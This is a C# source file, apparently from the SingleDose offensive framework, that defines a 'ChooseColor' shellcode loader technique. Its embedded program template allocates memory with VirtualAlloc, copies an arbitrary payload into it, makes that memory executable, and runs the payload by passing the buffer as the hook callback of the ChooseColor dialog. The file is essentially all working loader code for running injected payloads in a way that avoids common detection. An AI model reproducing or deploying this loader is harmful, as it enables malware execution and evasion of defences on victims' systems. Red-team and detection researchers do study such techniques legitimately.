using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    internal class ChooseColor : ITechnique
    {
        string ITechnique.TechniqueName => "ChooseColor";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://github.com/Wra7h/FlavorTown"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "ChooseColor" };

        List<string> ITechnique.Prerequisites => null;
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}

            uint CC_ENABLEHOOK = 0x10;
            CHOOSECOLOR sCC = new CHOOSECOLOR();
            sCC.lStructSize = (uint)Marshal.SizeOf(sCC);
            sCC.Flags = CC_ENABLEHOOK;
            sCC.lpfnHook = hAlloc;

            ChooseColor(ref sCC);
        }
        {{ARGS}}
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct CHOOSECOLOR
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public uint rgbResult;
            public IntPtr lpCustColors;
            public uint Flags;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpTemplateName;
        }

        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
